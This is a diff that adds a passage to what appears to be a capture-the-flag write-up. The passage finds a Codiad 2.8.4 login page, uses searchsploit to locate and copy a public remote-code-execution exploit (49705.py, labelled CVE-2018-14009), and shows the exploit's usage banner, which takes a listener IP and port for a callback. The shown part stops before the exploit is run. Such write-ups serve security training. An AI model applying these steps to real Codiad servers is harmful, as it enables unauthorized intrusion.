@@ -104,7 +104,61 @@ Let's move on to the browser and see what is the results of port 80.
 ![image](https://cdn-images-1.medium.com/max/1000/1*Hrz8Xm3kkwlF9JzIOuw9bw.png)
 
 There is apache default page. On other cases, I used to keep scanning it with gobuster to enumarate other directories on the system.
-But there is another port that runs HTTP service on it so let's check it.
+But there is another port that runs HTTP service on it so let's check it:
+
+```
+http://<machine-address>:62337
+```
+
+![image](https://cdn-images-1.medium.com/max/1000/1*gpiBdpXmt5DCKZC__qVyOQ.png)
+
+There is login page to codiad v2.8.4
+
+What is codiad?
+Codiad is an open-source web-based integrated development environment (IDE).
+
+I tried some default credentials but without any success.
+The next step is to check if there is any CVE to this codiad version to exploit with serachsploit.
+
+```
+searchsploit codiad 2.8.4
+```
+
+![image](https://cdn-images-1.medium.com/max/1000/1*sUkIiY8Sby0fFbYnDMXzXQ.png)
+
+Grab the exploit into your machine:
+
+```
+searchsploit -m 49705.py
+```
+
+CVE-2018-14009: 
+This exploit allows RCE on codiad v2.8.4.
+
+While execute it, there is a banner with usage information.
+
+```
+python3 49705.py
+Usage : 
+        python 49705.py [URL] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
+        python 49705.py [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT] [PLATFORM]
+Example : 
+        python 49705.py http://localhost/ admin admin 8.8.8.8 8888 linux
+        python 49705.py http://localhost:8080/ admin admin 8.8.8.8 8888 windows
+Author : 
+        WangYihang <wangyihanger@gmail.com>
+```
+
+
+
+
+
+
+
+
+
+
+
 
 
 
